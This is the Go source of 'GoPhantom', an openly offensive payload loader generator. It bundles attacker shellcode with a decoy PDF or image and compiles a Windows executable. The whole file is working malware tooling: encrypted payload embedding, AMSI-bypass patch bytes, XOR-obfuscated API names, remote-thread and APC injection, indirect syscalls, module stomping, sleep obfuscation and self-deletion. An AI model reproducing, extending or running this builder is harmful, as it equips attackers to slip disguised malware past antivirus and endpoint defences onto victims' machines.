package main

import (
	"bytes"
	"compress/zlib"
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"embed"
	"encoding/base64"
	"encoding/binary"
	"flag"
	"fmt"
	"github.com/watanabe-hsad/GoPhantom/internal/keymgr"
	"github.com/watanabe-hsad/GoPhantom/internal/knowledge"
	"golang.org/x/crypto/chacha20poly1305"
	"io"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"text/template"
)

const logo = `
   ___        ___ _                 _
  / _ \___   / _ \ |__   __ _ _ __ | |_ ___  _ __ ___
 / /_\/ _ \ / /_)/ '_ \ / _' | '_ \| __/ _ \| '_ ' _ \
/ /_\\ (_) / ___/| | | | (_| | | | | || (_) | | | | | |
\____/\___/\/    |_| |_|\__,_|_| |_|\__\___/|_| |_| |_|

          >> Advanced Payload Loader Generator <<
                                        v1.5 by hsad
`

//go:embed templates/*.tmpl
var templateFS embed.FS

//go:embed build/go.mod.tmpl
var buildGoMod string

//go:embed build/go.sum
var buildGoSum string

// BuildContext 保存一次生成流程中的外部依赖。
// Rand 默认为 crypto/rand.Reader；设置 GOPHANTOM_SALT 时会切换为确定性 DRBG。
type BuildContext struct {
	Rand io.Reader
}

func newBuildContext() BuildContext {
	return BuildContext{Rand: rand.Reader}
}

func (ctx BuildContext) random() io.Reader {
	if ctx.Rand == nil {
		return rand.Reader
	}
	return ctx.Rand
}

// hmacDRBG 基于 HMAC-SHA256 计数器模式的确定性随机字节生成器。
// 不用于密码学安全场景，仅用于可复现构建中的确定性字节派生。
type hmacDRBG struct {
	mu      sync.Mutex
	seed    []byte // HMAC key
	counter uint64
	buf     []byte // 未消费的缓冲
}

func newHMACDRBG(seed []byte) *hmacDRBG {
	return &hmacDRBG{seed: seed}
}

func (d *hmacDRBG) Read(p []byte) (int, error) {
	d.mu.Lock()
	defer d.mu.Unlock()
	for len(d.buf) < len(p) {
		var ctr [8]byte
		binary.BigEndian.PutUint64(ctr[:], d.counter)
		d.counter++
		mac := hmac.New(sha256.New, d.seed)
		mac.Write(ctr[:])
		d.buf = append(d.buf, mac.Sum(nil)...)
	}
	n := copy(p, d.buf[:len(p)])
	d.buf = d.buf[n:]
	return n, nil
}

type TemplateData struct {
	EncryptedPayload string
	EncryptedDecoy   string
	Salt             string
	DecoyFileName    string
	EnableObfuscate  bool
	EnableMutate     bool
	EnableCompress   bool
	EnableSelfDelete bool
	InjectMode       string // ""=本地线程, "earlybird"=APC注入, "inject"=远程线程注入
	DelaySeconds     int
	// v2.1: 字符串混淆
	StringKey      byte
	EncodedStrings map[string]string
	// v2.1: AMSI patch 多态
	AMSIPatch string
	// v2.2: 用户选择的 evasion 技术代码片段
	EvasionSnippets []EvasionSnippet
	// v2.0: Indirect Syscall 引擎
	EnableIndirectSyscall bool
	// v2.0: Module Stomping
	StompDLL string // 牺牲 DLL 名称（空=不启用）
	// v2.0: 环境绑定加密
	EnableEnvBind   bool     // 是否启用环境绑定密钥派生
	EnvBindFeatures []string // 绑定的特征列表（如 ["hostname", "domain"]）
	EnvBindHash     string   // 环境特征 SHA-256 哈希（base64，用于运行时校验）
	// v2.0: 内存权限混淆
	EnableMemObf bool // 是否启用 RW→NoAccess→RX 三步权限翻转
}

// EvasionSnippet 表示一个已解析的 evasion 技术代码片段
type EvasionSnippet struct {
	FuncName string // 函数名，如 "evasionT001"
	Code     string // 完整的 Go 函数代码（ENC: 占位符已替换）
}

type encryptedAssets struct {
	Payload         string
	Decoy           string
	Salt            []byte
	EnableEnvBind   bool
	EnvBindFeatures []string
	EnvBindHash     string
}

// ── Flag 解析基础设施 ──────────────────────────────────────────────

// StringList 实现 flag.Value 接口，支持逗号分隔的列表型 flag
// 用法示例: -evasion-techs=etw-patch,amsi-bypass,unhook
type StringList []string

func (s *StringList) String() string {
	if s == nil {
		return ""
	}
	return strings.Join(*s, ",")
}

func (s *StringList) Set(val string) error {
	*s = nil // 重置，避免多次 -flag 时累加
	for _, item := range strings.Split(val, ",") {
		item = strings.TrimSpace(item)
		if item != "" {
			*s = append(*s, item)
		}
	}
	return nil
}

// Config 集中管理所有命令行选项
// 新增 flag 只需：1) 在此加字段  2) 在 registerFlags 加一行  3) 按需更新 Validate/Features
type Config struct {
	// ── 必选参数 ──
	Decoy   string // 诱饵文件路径
	Payload string // shellcode 文件路径
	Output  string // 输出可执行文件名

	// ── 可选开关（bool） ──
	Obfuscate       bool   // sleep 混淆
	Mutate          bool   // shellcode 变异
	Compress        bool   // zlib 压缩
	SelfDelete      bool   // 重启时自删除 EXE
	InjectMode      string // 注入模式: ""(默认本地线程) / "inject"(远程线程) / "earlybird"(APC注入)
	IndirectSyscall bool   // v2.0: 启用 Indirect Syscall 引擎
	StompDLL        string // v2.0: Module Stomping 牺牲 DLL 名称（空=不启用）
	EnvBind         string // v2.0: 环境绑定 key=value 对（逗号分隔）
	MemObf          bool   // v2.0: 内存权限混淆（RW→NoAccess→RX）

	// ── 向后兼容的旧 bool flag（内部映射到 InjectMode）──
	legacyInject    bool
	legacyEarlyBird bool

	// ── 可选数值 ──
	Delay int // 延迟执行秒数

	// ── 可选列表（逗号分隔） ──
	EvasionTechs StringList // evasion 技术 ID 列表，如 T001,T003
}

// registerFlags 将 Config 字段绑定到标准 flag 包
// 所有 flag 名称与 v1.5 完全一致，保持向后兼容
func registerFlags(cfg *Config) {
	// 必选
	flag.StringVar(&cfg.Decoy, "decoy", "", "Required: Path to the decoy file (e.g., a PDF or image).")
	flag.StringVar(&cfg.Payload, "payload", "", "Required: Path to the raw x64 shellcode file (e.g., beacon.bin).")
	flag.StringVar(&cfg.Output, "out", "", "Required: Final output executable name.")

	// 可选 bool
	flag.BoolVar(&cfg.Obfuscate, "obfuscate", false, "Optional: Enable sleep-obfuscation in generated loader.")
	flag.BoolVar(&cfg.Mutate, "mutate", false, "Optional: Enable shellcode mutation with random NOPs.")
	flag.BoolVar(&cfg.Compress, "compress", true, "Optional: Enable zlib compression of embedded data (default: true).")
	flag.StringVar(&cfg.InjectMode, "inject-mode", "", "Optional: Injection mode: 'inject' (remote thread) or 'earlybird' (APC). Default: local thread.")
	flag.BoolVar(&cfg.SelfDelete, "self-delete", false, "Optional: Mark EXE for deletion on next reboot.")
	flag.BoolVar(&cfg.IndirectSyscall, "indirect-syscall", false, "Optional: Enable Indirect Syscall engine (v2.0).")
	flag.StringVar(&cfg.StompDLL, "stomp-dll", "", "Optional: DLL name for Module Stomping (e.g., winhttp.dll). Empty=disabled.")
	flag.StringVar(&cfg.EnvBind, "env-bind", "", "Optional: Environment-bound encryption. Comma-separated key=value pairs (e.g., hostname=DC01,domain=CORP.LOCAL).")
	flag.BoolVar(&cfg.MemObf, "mem-obf", false, "Optional: Enable memory permission obfuscation (RW→NoAccess→RX three-step flip).")

	// 向后兼容：旧的 -inject / -earlybird bool flag 仍可使用
	flag.BoolVar(&cfg.legacyInject, "inject", false, "Deprecated: use -inject-mode=inject instead.")
	flag.BoolVar(&cfg.legacyEarlyBird, "earlybird", false, "Deprecated: use -inject-mode=earlybird instead.")

	// 可选数值
	flag.IntVar(&cfg.Delay, "delay", 0, "Optional: Delay N seconds before payload execution.")

	// 可选列表
	flag.Var(&cfg.EvasionTechs, "evasion-techs", "Comma-separated evasion technique IDs (e.g., T001,T003).")
}

// Validate 校验参数合法性，返回错误提示列表。
// 同时处理旧 flag 到 InjectMode 的迁移。
func (c *Config) Validate() []string {
	var errs []string
	if c.Decoy == "" {
		errs = append(errs, "[-] Missing -decoy: specify a decoy file path")
	}
	if c.Payload == "" {
		errs = append(errs, "[-] Missing -payload: specify a shellcode file path")
	}
	if c.Output == "" {
		errs = append(errs, "[-] Missing -out: specify an output file name")
	}

	// 向后兼容：旧 -inject / -earlybird bool flag 映射到 InjectMode
	if c.InjectMode == "" {
		if c.legacyEarlyBird {
			c.InjectMode = "earlybird"
		} else if c.legacyInject {
			c.InjectMode = "inject"
		}
	}

	// 校验 inject-mode 取值
	switch c.InjectMode {
	case "", "inject", "earlybird":
		// 合法值
	default:
		errs = append(errs, fmt.Sprintf("[-] Invalid -inject-mode '%s': must be 'inject' or 'earlybird'", c.InjectMode))
	}

	// 校验 evasion-techs ID 是否存在于知识库
	if len(c.EvasionTechs) > 0 {
		_, invalid := knowledge.ByIDs(c.EvasionTechs)
		for _, id := range invalid {
			errs = append(errs, fmt.Sprintf("[-] Unknown evasion technique ID '%s': available T001-T005", id))
		}
	}

	// 校验 env-bind 格式
	if c.EnvBind != "" {
		for _, pair := range strings.Split(c.EnvBind, ",") {
			pair = strings.TrimSpace(pair)
			if pair == "" {
				continue
			}
			parts := strings.SplitN(pair, "=", 2)
			if len(parts) != 2 || parts[0] == "" || parts[1] == "" {
				errs = append(errs, fmt.Sprintf("[-] Invalid -env-bind format '%s': must be key=value", pair))
				continue
			}
			key := strings.TrimSpace(parts[0])
			switch key {
			case "hostname", "domain", "username", "hostsfile":
				// 合法特征名
			default:
				errs = append(errs, fmt.Sprintf("[-] Unknown env-bind feature '%s': must be hostname, domain, username, or hostsfile", key))
			}
		}
	}

	return errs
}

// Features 返回当前启用的功能名称列表，用于日志输出
func (c *Config) Features() []string {
	var features []string
	if c.Compress {
		features = append(features, "Data Compression")
	}
	if c.Obfuscate {
		features = append(features, "Sleep Obfuscation")
	}
	if c.Mutate {
		features = append(features, "Code Mutation")
	}
	switch c.InjectMode {
	case "inject":
		features = append(features, "Process Injection (Remote Thread)")
	case "earlybird":
		features = append(features, "Early Bird APC Injection")
	}
	if c.SelfDelete {
		features = append(features, "Self-Delete on Reboot")
	}
	if c.IndirectSyscall {
		features = append(features, "Indirect Syscall Engine")
	}
	if c.StompDLL != "" {
		features = append(features, fmt.Sprintf("Module Stomping (%s)", c.StompDLL))
	}
	if c.EnvBind != "" {
		features = append(features, "Env-Bound ChaCha20 Encryption")
	}
	if c.MemObf {
		features = append(features, "Memory Permission Obfuscation")
	}
	if c.Delay > 0 {
		features = append(features, fmt.Sprintf("Delay %ds", c.Delay))
	}
	if len(c.EvasionTechs) > 0 {
		techs, _ := knowledge.ByIDs(c.EvasionTechs)
		for _, t := range techs {
			features = append(features, fmt.Sprintf("Evasion: %s", t.Name))
		}
	}
	return features
}

// encodeString 对敏感字符串做 XOR 编码，编译时注入模板
func encodeString(s string, key byte) string {
	b := []byte(s)
	for i := range b {
		b[i] ^= key
	}
	return base64.StdEncoding.EncodeToString(b)
}

// generateStringKey 生成 XOR 密钥（避开 0x00）
// 使用 buildRand 以支持确定性构建
func generateStringKey(random io.Reader) byte {
	b := make([]byte, 1)
	for {
		if _, err := io.ReadFull(random, b); err != nil {
			continue
		}
		if b[0] != 0 {
			return b[0]
		}
	}
}

// selectAMSIPatch 选择一种等效 AMSI patch
// 使用 buildRand 以支持确定性构建
func selectAMSIPatch(random io.Reader) string {
	patches := [][]byte{
		{0x31, 0xC0, 0xC3},                   // xor eax,eax; ret (S_OK=0)
		{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}, // mov eax,E_INVALIDARG; ret
		{0xB8, 0x01, 0x00, 0x00, 0x00, 0xC3}, // mov eax,1; ret (AMSI_RESULT_CLEAN)
	}
	b := make([]byte, 1)
	_, _ = io.ReadFull(random, b)
	idx := int(b[0]) % len(patches)
	return base64.StdEncoding.EncodeToString(patches[idx])
}

// buildEncodedStrings 预编码所有敏感字符串
// extraAPIs 为 evasion 技术引入的额外 API 名称
func buildEncodedStrings(key byte, extraAPIs []string) map[string]string {
	sensitive := []string{
		"kernel32.dll",
		"ntdll.dll",
		"user32.dll",
		"advapi32.dll",
		"shell32.dll",
		"amsi.dll",
		"C:\\Windows\\System32\\ntdll.dll",
		"CreateFileA",
		"ReadFile",
		"GetFileSize",
		"CloseHandle",
		"VirtualProtect",
		"GetModuleHandleA",
		"EtwEventWrite",
		"NtTraceEvent",
		"AmsiScanBuffer",
		"IsDebuggerPresent",
		"CheckRemoteDebuggerPresent",
		"GetCurrentProcess",
		"NtQueryInformationProcess",
		"RegOpenKeyExA",
		"RegCloseKey",
		"CreateToolhelp32Snapshot",
		"Process32FirstW",
		"Process32NextW",
		"GetCurrentThread",
		"GetThreadContext",
		"GetSystemInfo",
		"GlobalMemoryStatusEx",
		"GetDiskFreeSpaceExA",
		"GetTickCount64",
		"GetLastInputInfo",
		"GetTickCount",
		"GetSystemMetrics",
		"SHGetFolderPathA",
		"FindFirstFileA",
		"FindNextFileA",
		"FindClose",
		"GetModuleFileNameW",
		"MoveFileExW",
		"GetEnvironmentVariableW",
		"GetUserNameW",
		"GetComputerNameW",
		"QueryFullProcessImageNameW",
		"OpenProcess",
		"NtAllocateVirtualMemory",
		"VirtualAlloc",
		"NtProtectVirtualMemory",
		"NtCreateThreadEx",
		"CreateThread",
		"WaitForSingleObject",
		"EnumChildWindows",
		"GetDesktopWindow",
		"VirtualAllocEx",
		"WriteProcessMemory",
		"NtWriteVirtualMemory",
		"VirtualProtectEx",
		"CreateRemoteThread",
		"CreateProcessW",
		"NtQueueApcThreadEx",
		"QueueUserAPC",
		"ResumeThread",
		"ShellExecuteA",
		"GetCurrentProcessId",
		"GetSystemTimeAsFileTime",
		"QueryPerformanceCounter",
		"GetCurrentThreadId",
		"VirtualFree",
		"LoadLibraryA",
	}
	// 合并 evasion 技术引入的额外 API（去重）
	if len(extraAPIs) > 0 {
		existing := make(map[string]bool, len(sensitive))
		for _, s := range sensitive {
			existing[s] = true
		}
		for _, api := range extraAPIs {
			if !existing[api] {
				sensitive = append(sensitive, api)
				existing[api] = true
			}
		}
	}
	m := make(map[string]string, len(sensitive))
	for _, s := range sensitive {
		m[s] = encodeString(s, key)
	}
	return m
}

// resolveSnippetStrings 将代码片段中的 ENC:APIName 占位符替换为实际编码值
func resolveSnippetStrings(code string, encodedStrings map[string]string) string {
	for apiName, encoded := range encodedStrings {
		code = strings.ReplaceAll(code, "ENC:"+apiName, encoded)
	}
	return code
}

func encryptAESGCM(plaintext []byte, key []byte, enableCompress bool, random io.Reader) (string, error) {
	data := make([]byte, len(plaintext))
	copy(data, plaintext)

	// XOR加密层 (使用AES密钥前8字节)
	xorKey := key[:8]
	for i := range data {
		data[i] ^= xorKey[i%8]
	}

	// 如果启用压缩，先压缩数据
	if enableCompress {
		var compressedBuf bytes.Buffer
		writer := zlib.NewWriter(&compressedBuf)
		if _, err := writer.Write(data); err != nil {
			return "", err
		}
		if err := writer.Close(); err != nil {
			return "", err
		}
		data = compressedBuf.Bytes()
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(random, nonce); err != nil {
		return "", err
	}
	ciphertext := gcm.Seal(nonce, nonce, data, nil)
	return base64.StdEncoding.EncodeToString(ciphertext), nil
}

// encryptChaCha20 使用 ChaCha20-Poly1305 加密数据（环境绑定模式）
func encryptChaCha20(plaintext []byte, key []byte, enableCompress bool, random io.Reader) (string, error) {
	data := make([]byte, len(plaintext))
	copy(data, plaintext)

	// XOR 加密层（与 AES-GCM 路径一致）
	xorKey := key[:8]
	for i := range data {
		data[i] ^= xorKey[i%8]
	}

	if enableCompress {
		var compressedBuf bytes.Buffer
		writer := zlib.NewWriter(&compressedBuf)
		if _, err := writer.Write(data); err != nil {
			return "", err
		}
		if err := writer.Close(); err != nil {
			return "", err
		}
		data = compressedBuf.Bytes()
	}

	aead, err := chacha20poly1305.NewX(key) // XChaCha20-Poly1305, 24-byte nonce
	if err != nil {
		return "", err
	}
	nonce := make([]byte, aead.NonceSize()) // 24 bytes for XChaCha20
	if _, err := io.ReadFull(random, nonce); err != nil {
		return "", err
	}
	ciphertext := aead.Seal(nonce, nonce, data, nil)
	return base64.StdEncoding.EncodeToString(ciphertext), nil
}

func loadInputs(cfg Config) ([]byte, []byte, error) {
	decoyBytes, err := os.ReadFile(cfg.Decoy)
	if err != nil {
		return nil, nil, fmt.Errorf("failed to read decoy file: %w", err)
	}
	shellcodeBytes, err := os.ReadFile(cfg.Payload)
	if err != nil {
		return nil, nil, fmt.Errorf("failed to read payload file: %w", err)
	}
	return decoyBytes, shellcodeBytes, nil
}

func parseEnvBindPairs(raw string) (pairs []string, features []string) {
	for _, pair := range strings.Split(raw, ",") {
		pair = strings.TrimSpace(pair)
		if pair == "" {
			continue
		}
		parts := strings.SplitN(pair, "=", 2)
		pairs = append(pairs, pair)
		features = append(features, strings.TrimSpace(parts[0]))
	}
	return pairs, features
}

func prepareEncryptedAssets(ctx BuildContext, cfg Config, decoyBytes, shellcodeBytes []byte) (encryptedAssets, error) {
	random := ctx.random()
	assets := encryptedAssets{}

	if cfg.EnvBind != "" {
		assets.EnableEnvBind = true
		envPairs, features := parseEnvBindPairs(cfg.EnvBind)
		assets.EnvBindFeatures = features
		assets.EnvBindHash = keymgr.ComputeEnvHash(envPairs)

		log.Printf("[+] Env-bound encryption: deriving key from %d features...", len(envPairs))
		key, salt, err := keymgr.DeriveKeyFromEnvValuesWithReader(envPairs, random)
		if err != nil {
			return assets, fmt.Errorf("failed to derive env-bound key: %w", err)
		}
		assets.Salt = salt

		log.Println("[+] Encrypting decoy with ChaCha20-Poly1305 (env-bound key)...")
		assets.Decoy, err = encryptChaCha20(decoyBytes, key, cfg.Compress, random)
		if err != nil {
			return assets, fmt.Errorf("failed to encrypt decoy file: %w", err)
		}

		log.Println("[+] Encrypting payload with ChaCha20-Poly1305 (env-bound key)...")
		assets.Payload, err = encryptChaCha20(shellcodeBytes, key, cfg.Compress, random)
		if err != nil {
			return assets, fmt.Errorf("failed to encrypt payload file: %w", err)
		}
		return assets, nil
	}

	log.Println("[+] Deriving AES-256 key using Argon2id...")
	aesKey, salt, err := keymgr.DeriveKeyAndSalt()
	if err != nil {
		return assets, fmt.Errorf("failed to derive key and salt: %w", err)
	}
	assets.Salt = salt

	log.Println("[+] Encrypting decoy file with derived key...")
	assets.Decoy, err = encryptAESGCM(decoyBytes, aesKey, cfg.Compress, random)
	if err != nil {
		return assets, fmt.Errorf("failed to encrypt decoy file: %w", err)
	}

	log.Println("[+] Encrypting payload file with the same derived key...")
	assets.Payload, err = encryptAESGCM(shellcodeBytes, aesKey, cfg.Compress, random)
	if err != nil {
		return assets, fmt.Errorf("failed to encrypt payload file: %w", err)
	}
	return assets, nil
}

func buildTemplateData(ctx BuildContext, cfg Config, assets encryptedAssets) TemplateData {
	random := ctx.random()
	log.Println("[+] Generating string obfuscation key and AMSI patch variant...")
	strKey := generateStringKey(random)

	var selectedTechs []knowledge.Technique
	var extraAPIs []string
	if len(cfg.EvasionTechs) > 0 {
		selectedTechs, _ = knowledge.ByIDs(cfg.EvasionTechs)
		for _, t := range selectedTechs {
			extraAPIs = append(extraAPIs, t.APIs...)
		}
	}

	encodedStrings := buildEncodedStrings(strKey, extraAPIs)
	amsiPatch := selectAMSIPatch(random)

	var evasionSnippets []EvasionSnippet
	for _, t := range selectedTechs {
		evasionSnippets = append(evasionSnippets, EvasionSnippet{
			FuncName: "evasion" + t.ID,
			Code:     resolveSnippetStrings(t.CodeSnippet, encodedStrings),
		})
	}

	return TemplateData{
		EncryptedPayload:      assets.Payload,
		EncryptedDecoy:        assets.Decoy,
		Salt:                  base64.StdEncoding.EncodeToString(assets.Salt),
		DecoyFileName:         filepath.Base(cfg.Decoy),
		EnableObfuscate:       cfg.Obfuscate,
		EnableMutate:          cfg.Mutate,
		EnableCompress:        cfg.Compress,
		EnableSelfDelete:      cfg.SelfDelete,
		InjectMode:            cfg.InjectMode,
		DelaySeconds:          cfg.Delay,
		StringKey:             strKey,
		EncodedStrings:        encodedStrings,
		AMSIPatch:             amsiPatch,
		EvasionSnippets:       evasionSnippets,
		EnableIndirectSyscall: cfg.IndirectSyscall,
		StompDLL:              cfg.StompDLL,
		EnableEnvBind:         assets.EnableEnvBind,
		EnvBindFeatures:       assets.EnvBindFeatures,
		EnvBindHash:           assets.EnvBindHash,
		EnableMemObf:          cfg.MemObf,
	}
}

func renderLoader(data TemplateData) ([]byte, error) {
	tmpl, err := template.New("loader.go.tmpl").ParseFS(templateFS, "templates/*.tmpl")
	if err != nil {
		return nil, fmt.Errorf("failed to parse loader templates: %w", err)
	}

	var sourceCode bytes.Buffer
	if err := tmpl.Execute(&sourceCode, data); err != nil {
		return nil, fmt.Errorf("failed to execute template: %w", err)
	}
	return sourceCode.Bytes(), nil
}

func normalizeOutputPath(output string) (string, error) {
	absOutputFile, err := filepath.Abs(output)
	if err != nil {
		return "", fmt.Errorf("failed to get absolute path: %w", err)
	}
	if filepath.Ext(absOutputFile) == "" {
		absOutputFile += ".exe"
	}
	return absOutputFile, nil
}

func buildWindowsBinary(source []byte, output string) error {
	tmpDir, err := os.MkdirTemp("", "gophantom-build-*")
	if err != nil {
		return fmt.Errorf("failed to create temp directory: %w", err)
	}
	defer os.RemoveAll(tmpDir)

	if err := os.WriteFile(filepath.Join(tmpDir, "loader.go"), source, 0644); err != nil {
		return fmt.Errorf("failed to write loader source: %w", err)
	}
	if err := os.WriteFile(filepath.Join(tmpDir, "go.mod"), []byte(buildGoMod), 0644); err != nil {
		return fmt.Errorf("failed to create temp go.mod: %w", err)
	}
	if err := os.WriteFile(filepath.Join(tmpDir, "go.sum"), []byte(buildGoSum), 0644); err != nil {
		return fmt.Errorf("failed to create temp go.sum: %w", err)
	}

	cmd := exec.Command("go", "build", "-mod=mod", "-o", output, "-ldflags", "-s -w -H windowsgui", "loader.go")
	cmd.Dir = tmpDir
	cmd.Env = append(os.Environ(), "CGO_ENABLED=0", "GOOS=windows", "GOARCH=amd64")

	buildOutput, err := cmd.CombinedOutput()
	if err != nil {
		if len(buildOutput) > 0 {
			return fmt.Errorf("x64 compilation failed: %w\n%s", err, string(buildOutput))
		}
		return fmt.Errorf("x64 compilation failed: %w", err)
	}
	return nil
}

func run(ctx BuildContext, cfg Config) (string, error) {
	decoyBytes, shellcodeBytes, err := loadInputs(cfg)
	if err != nil {
		return "", err
	}

	assets, err := prepareEncryptedAssets(ctx, cfg, decoyBytes, shellcodeBytes)
	if err != nil {
		return "", err
	}

	log.Println("[+] Generating loader source code...")
	data := buildTemplateData(ctx, cfg, assets)
	sourceCode, err := renderLoader(data)
	if err != nil {
		return "", err
	}

	log.Printf("[+] Cross-compiling for windows/amd64...")
	if features := cfg.Features(); len(features) > 0 {
		log.Printf("[+] Optional features: %v", features)
	}

	absOutputFile, err := normalizeOutputPath(cfg.Output)
	if err != nil {
		return "", err
	}

	log.Printf("[+] Building x64 version...")
	if err := buildWindowsBinary(sourceCode, absOutputFile); err != nil {
		return "", err
	}
	return absOutputFile, nil
}

func main() {
	// 确保在 Windows 上也能正常显示输出
	log.SetFlags(0)

	// ── 注册并解析命令行参数 ──
	var cfg Config
	registerFlags(&cfg)

	// 自定义用法信息
	flag.Usage = func() {
		fmt.Fprintf(os.Stderr, "%s\n", logo)
		fmt.Fprintf(os.Stderr, "Usage: %s [OPTIONS]\n\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "Required flags:\n")
		fmt.Fprintf(os.Stderr, "  -decoy string\n        Path to the decoy file (e.g., a PDF or image)\n")
		fmt.Fprintf(os.Stderr, "  -payload string\n        Path to the raw x64 shellcode file (e.g., beacon.bin)\n")
		fmt.Fprintf(os.Stderr, "  -out string\n        Final output executable name\n\n")
		fmt.Fprintf(os.Stderr, "Optional flags:\n")
		fmt.Fprintf(os.Stderr, "  -compress\n        Enable zlib compression of embedded data (default: true)\n")
		fmt.Fprintf(os.Stderr, "  -delay int\n        Delay N seconds before payload execution (default: 0)\n")
		fmt.Fprintf(os.Stderr, "  -obfuscate\n        Enable sleep-obfuscation in generated loader\n")
		fmt.Fprintf(os.Stderr, "  -mutate\n        Enable shellcode mutation with random NOPs\n")
		fmt.Fprintf(os.Stderr, "  -inject-mode string\n        Injection mode: 'inject' (remote thread) or 'earlybird' (APC)\n")
		fmt.Fprintf(os.Stderr, "  -self-delete\n        Mark EXE for deletion on next reboot (MoveFileEx)\n")
		fmt.Fprintf(os.Stderr, "  -indirect-syscall\n        Enable Indirect Syscall engine (v2.0, bypasses user-mode hooks)\n")
		fmt.Fprintf(os.Stderr, "  -stomp-dll string\n        DLL name for Module Stomping (e.g., winhttp.dll, amstream.dll)\n")
		fmt.Fprintf(os.Stderr, "  -env-bind string\n        Env-bound encryption: key=value pairs (e.g., hostname=DC01,domain=CORP.LOCAL)\n")
		fmt.Fprintf(os.Stderr, "  -evasion-techs string\n        Comma-separated technique IDs (e.g., T001,T003,T005)\n")
		fmt.Fprintf(os.Stderr, "  -h, --help\n        Show this help message\n\n")
		fmt.Fprintf(os.Stderr, "Example:\n")
		fmt.Fprintf(os.Stderr, "  %s -decoy document.pdf -payload beacon.bin -out loader.exe\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "  %s -decoy image.jpg -payload calc.bin -out calc_loader.exe -obfuscate -mutate -inject-mode=earlybird -delay 30\n\n", os.Args[0])
	}

	// 检查帮助参数
	if len(os.Args) > 1 && (os.Args[1] == "-h" || os.Args[1] == "--help" || os.Args[1] == "-help") {
		flag.Usage()
		return
	}

	log.Print(logo)
	flag.Parse()

	// ── 校验参数 ──
	if errs := cfg.Validate(); len(errs) > 0 {
		fmt.Fprintln(os.Stderr)
		for _, e := range errs {
			fmt.Fprintf(os.Stderr, "  %s\n", e)
		}
		fmt.Fprintf(os.Stderr, "\nUse '%s -h' for help.\n\n", os.Args[0])
		os.Exit(1)
	}

	ctx := newBuildContext()
	if os.Getenv("GOPHANTOM_SALT") != "" {
		ctx.Rand = newHMACDRBG([]byte(os.Getenv("GOPHANTOM_SALT")))
		log.Println("[+] Deterministic build mode: all random values derived from GOPHANTOM_SALT.")
	}

	output64, err := run(ctx, cfg)
	if err != nil {
		log.Printf("[-] %v", err)
		os.Exit(1)
	}
	log.Printf("[✓] x64 build complete: %s", output64)

	log.Printf("\n[✓] Successfully generated GoPhantom v1.5 loader!")
	log.Printf("    Output: %s", output64)
}
